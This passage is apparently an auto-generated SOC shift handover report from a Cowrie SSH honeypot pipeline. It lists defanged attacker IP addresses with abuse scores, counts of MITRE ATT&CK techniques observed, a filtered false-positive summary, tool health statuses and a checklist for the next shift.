| `49.64.169[.]153` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `120.48.130[.]213` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.115[.]124` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `185.16.214[.]226` | RU | Start2 LLC | **100** ⚠️ | 50 |
| `14.103.118[.]198` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `124.70.68[.]216` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **80** ⚠️ | 1 |
| `18.144.173[.]162` | US | Amazon.com, Inc. | **42** | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 205 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 107 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 76 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 38 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 38 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 207 cases |
| Tool 34  | Credential Extractor        | ✅ 183 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 8 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 76 priority case(s) shown individually · 9 recon entry/entries in table (5 group(s) consolidating 125 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-14T17:15:49Z_
